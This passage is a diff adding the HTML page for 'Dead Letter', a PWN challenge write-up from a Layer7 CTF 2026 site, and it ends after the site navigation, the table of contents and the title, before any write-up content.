@@ -1,0 +1,2158 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="English write-ups for Layer7 CTF 2026 (Jeopardy + KoTH) with captured evidence and verified flags.">
+      
+      
+        <meta name="author" content="B0TCIL">
+      
+      
+        <link rel="canonical" href="https://fijarsatria.github.io/layer7-ctf-2026-writeups/challenges/7-dead-letter/">
+      
+      
+        <link rel="prev" href="../6-janus/">
+      
+      
+        <link rel="next" href="../14-mad-rabbit/">
+      
+      
+      <link rel="icon" href="../../assets/layer7.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
+    
+    
+      
+        <title>Dead Letter - Layer7 CTF 2026 — Write-ups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.342714a4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../stylesheets/layer7.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="green">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#tldr" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Layer7 CTF 2026 — Write-ups" class="md-header__button md-logo" aria-label="Layer7 CTF 2026 — Write-ups" data-md-component="logo">
+      
+  <img src="../../assets/layer7.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Layer7 CTF 2026 — Write-ups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Dead Letter
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="green" data-md-color-accent="green"  aria-label="Light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="green" data-md-color-accent="green"  aria-label="Dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/Fijarsatria/layer7-ctf-2026-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Layer7 CTF 2026 — Write-ups" class="md-nav__button md-logo" aria-label="Layer7 CTF 2026 — Write-ups" data-md-component="logo">
+      
+  <img src="../../assets/layer7.svg" alt="logo">
+
+    </a>
+    Layer7 CTF 2026 — Write-ups
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/Fijarsatria/layer7-ctf-2026-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../methodology/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Methodology
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../reproducibility/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Reproducibility
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../evidence/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Evidence index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../koth/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    KoTH
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            KoTH
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Glasshouse
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 1 — Glasshouse VM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 2 — Glasshouse VM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 3 — Glasshouse VM (Capability Confusion)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 4 — Glasshouse VM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 5 — Glasshouse VM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../koth/koth-stage-6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    KoTH Stage 6 — Glasshouse VM (Split Decoder)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    WEB
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            WEB
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../10-pipecake/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pipecake
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../11-forgotten/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Forgotten
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../22-roupang/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Roupang
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    PWN
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            PWN
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../21-whos-your-bias/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    whos your bias
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5-cartridge/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cartridge
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6-janus/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Janus
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Dead Letter
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Dead Letter
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    <span class="md-ellipsis">
+      TL;DR
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Analysis">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#heap-layout-created-by-open" class="md-nav__link">
+    <span class="md-ellipsis">
+      Heap layout created by open()
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ioctls" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ioctls
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gate-functions-reachable-through-slot0x10" class="md-nav__link">
+    <span class="md-ellipsis">
+      Gate functions reachable through slot[0x10]
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit chain
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#evidence" class="md-nav__link">
+    <span class="md-ellipsis">
+      Evidence
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      Flag
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#evidence_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Evidence
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Evidence">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#platform-submission" class="md-nav__link">
+    <span class="md-ellipsis">
+      Platform submission
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#captured-solver-transcript" class="md-nav__link">
+    <span class="md-ellipsis">
+      Captured solver transcript
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Flag
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    REV
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            REV
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14-mad-rabbit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Mad rabbit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../17-false-friends/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    False Friends
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../20-prism-box/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Prism Box
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../8-autoby/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Autoby
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    MISC
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            MISC
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1-mic-check/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    mic_check
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3-human-top-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    human top 1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#tldr" class="md-nav__link">
+    <span class="md-ellipsis">
+      TL;DR
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Analysis
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Analysis">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#heap-layout-created-by-open" class="md-nav__link">
+    <span class="md-ellipsis">
+      Heap layout created by open()
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ioctls" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ioctls
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gate-functions-reachable-through-slot0x10" class="md-nav__link">
+    <span class="md-ellipsis">
+      Gate functions reachable through slot[0x10]
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit chain
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#evidence" class="md-nav__link">
+    <span class="md-ellipsis">
+      Evidence
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      Flag
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#evidence_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Evidence
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Evidence">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#platform-submission" class="md-nav__link">
+    <span class="md-ellipsis">
+      Platform submission
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#captured-solver-transcript" class="md-nav__link">
+    <span class="md-ellipsis">
+      Captured solver transcript
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Flag
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="dead-letter">Dead Letter<a class="headerlink" href="#dead-letter" title="Permanent link">&para;</a></h1>
+<p><span class="nx-badge nx-badge-verified">VERIFIED</span> <span class="nx-chip">PWN</span> <span class="nx-chip">974 pts</span> <span class="nx-chip">id 7</span></p>
+
+<table>
+<thead>
+<tr>
